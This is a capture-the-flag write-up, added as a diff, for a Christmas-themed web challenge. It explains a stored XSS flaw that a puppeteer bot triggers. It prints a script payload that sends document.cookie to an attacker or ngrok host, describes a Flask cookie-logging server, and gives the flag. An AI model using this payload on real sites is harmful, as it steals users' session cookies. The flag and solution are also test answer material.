@@ -1,0 +1,31 @@
+<h1>Toy Workshop (300)</h1>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?</p>
+</blockquote>
+
+<ul>
+<li><a href="web_toy_workshop.zip">web<em>toy</em>workshop.zip</a></li>
+</ul>
+
+<h2>Solution</h2>
+
+<ol>
+<li><p>Let's start by looking at the <code>challenge/index.js</code> file in the source code zip. The application connects to a sqlite database (<code>const db = new Database('toy_workshop.db');</code>), so lets look at <code>database.js</code>.</p></li>
+<li><p><code>database.js</code> allows for adding and reading items from the database. While we do control the <code>query</code> variable via the website, it does not look like we would be able to accomplish anything using an SQL injection.</p></li>
+<li><p>Let's look at the <code>challenge/routes/index.js</code> file. There is an <code>/api/submit</code> endpoint which the frontend posts user data to. This function adds our user input, called a query, to the database and then calls <code>bot.readQueries(db)</code>. The <code>/queries</code> endpoint simply returns all the queries contained in the database. We cannot access the <code>/queries</code> endpoint because the IP address must be <code>127.0.0.1</code>, which is the localhost loopback address, otherwise the page redirects to <code>/</code>.</p></li>
+<li><p>Next, let's check out <code>challenge/bot.js</code> so we can figure out what <code>bot.readQueries(db)</code> does. <code>bot.js</code> imports puppeteer, a headless Chromium browser controlled via JavaScript, defines a <code>flag</code> variable that holds the flag, loads the index page of the application, sets the <code>flag</code> cookie in the browser, visits the <code>/queries</code> endpoint, and then exits.</p></li>
+<li><p>This is a stored cross-site scripting vulnerability (Stored XSS). We can send a malicious script through the frontend to the database. When a user visits the <code>/queries</code> page, the server will serve the malicious code to the user. We can craft our malicious code to grab the current cookies and then redirect to a webpage we control with those cookies as parameters in the request.</p></li>
+<li><p>The malicious code is standard XSS code: <code>&lt;script&gt;document.location='http://&lt;ATTACKER_SERVER&gt;?c='+document.cookie;&lt;/script&gt;</code>. We redirect to our webpage by changing the <code>document.location</code> and we set the <code>c</code> argument to <code>document.cookie</code>, which contains the current page's cookies.</p></li>
+<li><p>However, we need to actually run a server to receive this request and log the cookie. There is a basic <a href="https://flask.palletsprojects.com">Flask</a>, a micro web framework written in Python, application that does exactly this in <a href="xss-cookie-stealer.py">xss-cookie-stealer.py</a>. The script defines one route, <code>/</code>, that will read the <code>c</code> parameter in the request URL, open a file called <code>cookies.txt</code>, write the contents of the <code>c</code> parameter to that file, and then redirect to <code>https://google.com</code>. We run this server on all interfaces (<code>0.0.0.0</code>) on port <code>16361</code>.</p></li>
+<li><p>You can run this script anywhere that is internet accessible. For instance you can port forward port <code>16361</code> through your router or you could deploy a machine on Google Cloud. But, the easiest method is to use <a href="https://ngrok.com/">ngrok</a>.</p></li>
+<li><p>Create an account at <a href="https://ngrok.com/">https://ngrok.com/</a>, download the application, and get logged in. Now, start the Flask python server with <code>python xss-cookie-stealer.py</code> and then run <code>/ngrok http 16361</code>. Ngrok will display a URL in the form <code>http://&lt;subdomain&gt;.ngrok.io</code>.</p></li>
+<li><p>Paste your ngrok URL into the malicious payload. If ngrok said my URL was <code>http://92832de0.ngrok.io</code>, then the payload should be <code>&lt;script&gt;document.location='http://92832de0.ngrok.io?c='+document.cookie;&lt;/script&gt;</code></p></li>
+<li><p>Finally, paste the payload into the frontend for the application, wait a few second for the puppeteer instance to start and load the page, and then you should see the flag in your terminal running Flask and in the <code>cookies.txt</code> file.</p></li>
+</ol>
+
+<h3>Flag</h3>
+
+<p><code>HTB{3v1l_3lv3s_4r3_r1s1ng_up!}</code></p>
